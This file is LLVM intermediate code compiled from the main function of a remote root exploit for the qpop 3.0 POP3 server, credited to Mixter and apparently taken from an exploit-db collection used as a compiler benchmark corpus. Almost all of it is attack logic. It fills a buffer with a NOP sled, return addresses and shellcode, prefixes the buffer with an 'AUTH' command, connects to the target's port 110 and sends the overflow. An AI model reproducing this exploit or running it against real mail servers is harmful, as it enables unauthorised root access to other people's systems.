; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_19645.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_19645.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@LEN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@RET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [27 x i8] c"usage: %s <host> [offset]\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"use offset -1 to try local esp\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"Using local esp as ret address...\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@CODESTART = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [48 x i8] c"qpop 3.0 remote root exploit (linux) by Mixter\0A\00", align 1
@.str.4 = private unnamed_addr constant [55 x i8] c"[return address: 0x%lx buffer size: %d code size: %d]\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [17 x i8] c"write error: %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %6, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %7, align 8
  %17 = load i8*, i8** @shellcode, align 8
  store i8* %17, i8** %8, align 8
  %18 = load i64, i64* @RET, align 8
  store i64 %18, i64* %9, align 8
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %28

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %27 = call i32 @exit(i32 0) #4
  unreachable

28:                                               ; preds = %2
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %29, 2
  br i1 %30, label %31, label %51

31:                                               ; preds = %28
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @atoi(i8* %34)
  %36 = icmp eq i64 %35, -1
  br i1 %36, label %37, label %44

37:                                               ; preds = %31
  %38 = call i32 (...) @get_sp()
  %39 = sub nsw i32 %38, 8000
  %40 = load i32, i32* @LEN, align 4
  %41 = sub nsw i32 %39, %40
  %42 = sext i32 %41 to i64
  store i64 %42, i64* %9, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  br label %44

44:                                               ; preds = %37, %31
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i64 @atoi(i8* %47)
  %49 = load i64, i64* %9, align 8
  %50 = add nsw i64 %49, %48
  store i64 %50, i64* %9, align 8
  br label %51

51:                                               ; preds = %44, %28
  store i32 0, i32* %10, align 4
  br label %52

52:                                               ; preds = %61, %51
  %53 = load i32, i32* %10, align 4
  %54 = load i32, i32* @LEN, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %64

56:                                               ; preds = %52
  %57 = load i8, i8* @NOP, align 1
  %58 = load i32, i32* %10, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %16, i64 %59
  store i8 %57, i8* %60, align 1
  br label %61

61:                                               ; preds = %56
  %62 = load i32, i32* %10, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %10, align 4
  br label %52

64:                                               ; preds = %52
  %65 = load i32, i32* @CODESTART, align 4
  %66 = add nsw i32 %65, 2
  store i32 %66, i32* %10, align 4
  br label %67

67:                                               ; preds = %78, %64
  %68 = load i32, i32* %10, align 4
  %69 = load i32, i32* @LEN, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %81

71:                                               ; preds = %67
  %72 = load i64, i64* %9, align 8
  %73 = trunc i64 %72 to i32
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %16, i64 %75
  %77 = bitcast i8* %76 to i32*
  store i32 %73, i32* %77, align 1
  br label %78

78:                                               ; preds = %71
  %79 = load i32, i32* %10, align 4
  %80 = add nsw i32 %79, 4
  store i32 %80, i32* %10, align 4
  br label %67

81:                                               ; preds = %67
  %82 = load i32, i32* @CODESTART, align 4
  store i32 %82, i32* %10, align 4
  br label %83

83:                                               ; preds = %97, %81
  %84 = load i32, i32* %10, align 4
  %85 = load i32, i32* @CODESTART, align 4
  %86 = load i8*, i8** @shellcode, align 8
  %87 = call i32 @strlen(i8* %86)
  %88 = add nsw i32 %85, %87
  %89 = icmp slt i32 %84, %88
  br i1 %89, label %90, label %100

90:                                               ; preds = %83
  %91 = load i8*, i8** %8, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %8, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %16, i64 %95
  store i8 %93, i8* %96, align 1
  br label %97

97:                                               ; preds = %90
  %98 = load i32, i32* %10, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %10, align 4
  br label %83

100:                                              ; preds = %83
  %101 = getelementptr inbounds i8, i8* %16, i64 0
  store i8 65, i8* %101, align 16
  %102 = getelementptr inbounds i8, i8* %16, i64 1
  store i8 85, i8* %102, align 1
  %103 = getelementptr inbounds i8, i8* %16, i64 2
  store i8 84, i8* %103, align 2
  %104 = getelementptr inbounds i8, i8* %16, i64 3
  store i8 72, i8* %104, align 1
  %105 = getelementptr inbounds i8, i8* %16, i64 4
  store i8 32, i8* %105, align 4
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.3, i64 0, i64 0))
  %107 = load i64, i64* %9, align 8
  %108 = call i32 @strlen(i8* %16)
  %109 = load i8*, i8** @shellcode, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.4, i64 0, i64 0), i64 %107, i32 %108, i32 %110)
  %112 = call i32 @fflush(i32 0)
  %113 = load i32, i32* @AF_INET, align 4
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %113, i32* %114, align 4
  %115 = call i32 @htons(i32 110)
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %115, i32* %116, align 4
  %117 = load i8**, i8*** %5, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 1
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @resolve(i8* %119)
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %122 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %121, i32 0, i32 0
  store i32 %120, i32* %122, align 4
  %123 = load i32, i32* @AF_INET, align 4
  %124 = load i32, i32* @SOCK_STREAM, align 4
  %125 = call i32 @socket(i32 %123, i32 %124, i32 0)
  store i32 %125, i32* %11, align 4
  %126 = load i32, i32* %11, align 4
  %127 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %128 = call i64 @connect(i32 %126, %struct.sockaddr* %127, i32 4)
  %129 = icmp slt i64 %128, 0
  br i1 %129, label %130, label %133

130:                                              ; preds = %100
  %131 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %132 = call i32 @exit(i32 0) #4
  unreachable

133:                                              ; preds = %100
  %134 = load i32, i32* %11, align 4
  %135 = call i32 @strlen(i8* %16)
  %136 = call i32 @write(i32 %134, i8* %16, i32 %135)
  switch i32 %136, label %142 [
    i32 0, label %137
    i32 -1, label %137
  ]

137:                                              ; preds = %133, %133
  %138 = load i32, i32* @stderr, align 4
  %139 = load i32, i32* @errno, align 4
  %140 = call i8* @strerror(i32 %139)
  %141 = call i32 @fprintf(i32 %138, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i8* %140)
  br label %143

142:                                              ; preds = %133
  br label %143

143:                                              ; preds = %142, %137
  %144 = load i32, i32* %11, align 4
  %145 = call i32 @write(i32 %144, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 1)
  %146 = load i32, i32* %11, align 4
  %147 = call i32 @term(i32 %146, i32 0)
  store i32 0, i32* %3, align 4
  %148 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %148)
  %149 = load i32, i32* %3, align 4
  ret i32 %149
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @resolve(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i8* @strerror(i32) #2

declare dso_local i32 @term(i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
